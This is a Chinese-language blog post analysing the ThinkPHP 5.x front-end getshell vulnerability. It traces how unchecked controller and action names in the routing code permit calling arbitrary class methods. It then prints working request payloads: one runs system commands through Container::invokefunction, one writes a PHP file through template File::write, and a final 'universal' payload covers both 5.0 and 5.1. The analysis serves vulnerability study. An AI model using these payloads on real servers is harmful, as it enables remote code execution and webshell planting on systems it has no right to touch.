---
title: ThinkPHP5.x 前台getshell分析
date: 2018-12-11 17:26:18
tags:
	- 漏洞分析
	- ThinkPHP
---

# 前言

昨晚微博刷着刷着看到一个无条件的ThinkPHP5.x通杀前台getshell，然后群里面师傅们也都在讨论这件事了。感觉是个TP5写的站都是通杀，怕是一场腥风血雨。。。

官方给出的补丁，可以看到是路由上面出的问题，怪不得通杀。

![](ThinkPHP5-x-前台getshell分析\1.png)

# 漏洞分析

分析版本 ThinkPHP 5.1.30

## 路由调用

先从`thinkphp/library/think/route/dispatch/Url.php:20`看起

```php
    public function init()
    {
        // 解析默认的URL规则
        $result = $this->parseUrl($this->dispatch);
        return (new Module($this->request, $this->rule, $result))->init();
    }
```

`init`中进行了url解析然后将返回值赋值给`$result`，然后再传入到`Module`的`init()`中。

先来到解析url的部分，可以一直跟进到`thinkphp/library/think/route/Rule.php:947`

```php
public function parseUrlPath($url)
{
    // 分隔符替换 确保路由定义使用统一的分隔符
    $url = str_replace('|', '/', $url);
    $url = trim($url, '/');
    $var = [];

    if (false !== strpos($url, '?')) {
        // [模块/控制器/操作?]参数1=值1&参数2=值2...
        $info = parse_url($url);
        $path = explode('/', $info['path']);
        parse_str($info['query'], $var);
    } elseif (strpos($url, '/')) {
        // [模块/控制器/操作]
        $path = explode('/', $url);
    } elseif (false !== strpos($url, '=')) {
        // 参数1=值1&参数2=值2...
        $path = [];
        parse_str($url, $var);
    } else {
        $path = [$url];
    }

    return [$path, $var];
}
```

可以看到是单纯的根据`/`来进行分割，也就意味着其中可以插入一些自定义的字符。

最后返回一个这样的`[$module, $controller, $action]`数组

![](ThinkPHP5-x-前台getshell分析\2.png)

在`Module`初始化的时候，就会将`$result`数组赋值到`$this->dispatch`变量中

然后来到`Module`的`init()`方法

`thinkphp/library/think/route/dispatch/Module.php:27`

```php
public function init()
{
    parent::init();

    $result = $this->dispatch;

    if (is_string($result)) {
        $result = explode('/', $result);
    }

	.....

    // 是否自动转换控制器和操作名
    $convert = is_bool($this->convert) ? $this->convert : $this->rule->getConfig('url_convert');
    // 获取控制器名
    $controller       = strip_tags($result[1] ?: $this->rule->getConfig('default_controller'));
    $this->controller = $convert ? strtolower($controller) : $controller;

    // 获取操作名
    $this->actionName = strip_tags($result[2] ?: $this->rule->getConfig('default_action'));

    // 设置当前请求的控制器、操作
    $this->request
        ->setController(Loader::parseName($this->controller, 1))
        ->setAction($this->actionName);

    return $this;
}
```

可以看到`$this->controller`和`$this->actionName`是从变量`$result`值而来的

```php
$controller       = strip_tags($result[1] ?: $this->rule->getConfig('default_controller'));
$this->controller = $convert ? strtolower($controller) : $controller;
$this->actionName = strip_tags($result[2] ?: $this->rule->getConfig('default_action'));
```

而这`$result`的值是由`$this->dispatch`的值而来的。

```php
$result = $this->dispatch;
```

到了这里，漏洞也就差不多出来了，由于获取`$controller`和`$action`时没有进行什么检验，后面就是常规的调用类触发方法。

导致可以调用任意类的任意方法。只要找到几个存在危险函数调用的地方，就可以深度利用这个漏洞。

## 寻找触发点

触发点似乎有蛮多的，就挑几个说一下

### \think\Container invokefunction

`thinkphp/library/think/Container.php:340`

```php
public function invokeFunction($function, $vars = [])
{
    try {
        $reflect = new ReflectionFunction($function);
        $args = $this->bindParams($reflect, $vars);
        return call_user_func_array($function, $args);
    } catch (ReflectionException $e) {
        throw new Exception('function not exists: ' . $function . '()');
    }
}
```

可以直接看到`call_user_func_array`的调用，传入对应的`$function`和`$var`即可

```
s=index/\think\Container/invokefunction
&function=call_user_func_array
&vars[0]=system
&vars[1][]=dir
```

### \think\template\driver\File  write

`thinkphp/library/think/template/driver/File.php:27`

```php
public function write($cacheFile, $content)
{
    // 检测模板目录
    $dir = dirname($cacheFile);

    if (!is_dir($dir)) {
        mkdir($dir, 0755, true);
    }

    // 生成模板缓存文件
    if (false === file_put_contents($cacheFile, $content)) {
        throw new Exception('cache write error:' . $cacheFile, 11602);
    }
}
```

```php
s=index/\think\template\driver\File/write
&cacheFile=1.php
&content=<?=phpinfo();
```

就会生成一个`1.php`的文件

# 最后

可以调用的类还是相当多的，今天网上一搜，好多站都已经是马场了，惨惨惨。。。

后来知道5.0和5.1以及linux和win有点差异，放一个通用的payload

```
index.php
?s=index/\think\app/invokefunction
&function=call_user_func_array
&vars[0]=system
&vars[1][]=dir
```

